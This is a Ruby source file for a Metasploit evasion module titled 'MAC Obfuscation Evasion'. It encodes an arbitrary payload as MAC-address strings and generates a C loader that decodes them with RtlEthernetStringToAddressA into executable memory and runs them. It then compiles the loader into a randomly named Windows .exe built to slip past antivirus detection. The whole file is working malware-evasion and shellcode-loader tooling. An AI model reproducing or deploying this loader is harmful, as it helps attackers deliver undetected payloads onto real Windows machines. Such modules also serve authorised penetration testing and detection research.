##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/compiler/windows'

class MetasploitModule < Msf::Evasion

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'MAC Obfuscation Evasion',
        'Description' => %q{
          TODO
        },
        'Author' => [
          'msutovsky-r7'
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => ARCH_X64,
        'Targets' => [ [ 'Microsoft Windows', {} ] ]
      )
    )

    register_options([
      OptString.new(
        'FILENAME',
        [
          true,
          'Filename for the evasive file (default: random)',
          "#{Rex::Text.rand_text_alpha(3..10)}.exe"
        ]
      )
    ])
  end

  def c_template(payload)
    @c_template ||= %<
#include <Windows.h>

typedef NTSTATUS(NTAPI* fnRtlEthernetStringToAddressA)(
    PCSTR		S,
    PCSTR* Terminator,
    PVOID		Addr
    );

char * buf[] = { #{payload.to_s.gsub!(']', '').gsub!('[', '')} };

int main() {
    int lpBufSize = #{payload.length} * 6;
    PCSTR terminator = NULL;
    PBYTE lpBuf = VirtualAlloc(NULL, lpBufSize, MEM_COMMIT, 0x00000040);
    memset(lpBuf, 0, lpBufSize);
    PBYTE tmp = (PBYTE)(lpBuf);

    fnRtlEthernetStringToAddressA fncMacDeobfuscate = (fnRtlEthernetStringToAddressA)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlEthernetStringToAddressA");

    for (int i = 0; i != #{payload.length} ; i+=1) {
        fncMacDeobfuscate(buf[i], &terminator, (LPCSTR)tmp);
        tmp = tmp + 6;
    }

    void (*func)();
    func = (void (*)()) lpBuf;
    (void)(*func)();
    VirtualFree(lpBuf, lpBufSize, NULL);
    return 0;
}
    >
  end

  def mac_obfluscate(payload)
    bytes = payload.bytes
    # Pad to a multiple of 4 bytes
    remainder = bytes.length % 6
    bytes += [0] * (6 - remainder) if remainder != 0

    chunks = []
    bytes.each_slice(6) do |quad|
      chunks << quad.map { |b| format('%02X', b) }.join('-')
    end
    chunks
  end

  def run
    # This is used in the ERB template

    cpu = nil
    case arch
    when ['x86']
      cpu = Metasm::Ia32.new
    when ['x64']
      cpu = Metasm::X86_64.new
    else
      fail_with(Failure::NoTarget, 'Target arch is not compatible')
    end

    bin = Metasploit::Framework::Compiler::Windows.compile_c(c_template(mac_obfluscate(payload.encoded)), :exe, cpu)
    print_status("Compiled executable size: #{bin.length}")
    file_create(bin)
  end
end
